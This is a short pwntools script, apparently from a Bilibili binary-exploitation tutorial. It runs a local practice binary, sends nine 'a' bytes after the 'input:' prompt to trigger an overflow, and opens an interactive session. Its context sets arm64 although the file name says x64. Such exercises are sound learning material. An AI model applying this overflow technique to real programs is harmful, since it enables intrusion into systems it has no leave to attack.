'''
Author: Jack Jparrow
Date: 2022-08-18 17:20:20
LastEditTime: 2022-08-18 17:55:32
LastEditors: Jack Jparrow
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=12&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=920.6
'''

from pwn import *

context(log_level = 'debug', arch = 'arm64', os = 'linux')

io = process('./question_1_x64_new')
# io.recvuntil('input:\n')
# io.send('a' * 9)
payload = b'a' * 9
dem = b'input:\n'
io.sendafter(dem, payload)
io.interactive()#交互shell